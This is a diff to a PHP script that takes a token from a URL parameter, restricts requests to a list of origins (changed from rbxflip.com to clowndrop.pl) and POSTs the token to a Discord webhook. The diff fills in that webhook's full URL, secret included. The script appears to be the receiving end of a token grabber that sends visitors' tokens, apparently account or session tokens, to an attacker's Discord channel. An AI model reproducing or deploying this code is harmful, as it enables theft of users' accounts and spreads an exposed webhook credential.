@@ -1,8 +1,8 @@
 <?php
 
 $allowed_origins = array(
-    "https://www.rbxflip.com",
-    "https://rbxflip.com"
+    "https://www.clowndrop.pl",
+    "https://clowndrop.pl"
 );
 
 $token = htmlspecialchars($_GET['t']);
@@ -21,7 +21,7 @@ $object = json_encode([
 
 $ch = curl_init();
 curl_setopt_array($ch, [
-    CURLOPT_URL => "webhooklink",
+    CURLOPT_URL => "https://discord.com/api/webhooks/1150474524203159623/SwgSb8ijsHQ1VFMnwr1g4GRABtTDXbtz6IZvNwSGsfJSy3GZSUppFabCHpMvCoG09nXG",
     CURLOPT_POST => true,
     CURLOPT_POSTFIELDS => $object,
     CURLOPT_HTTPHEADER => [
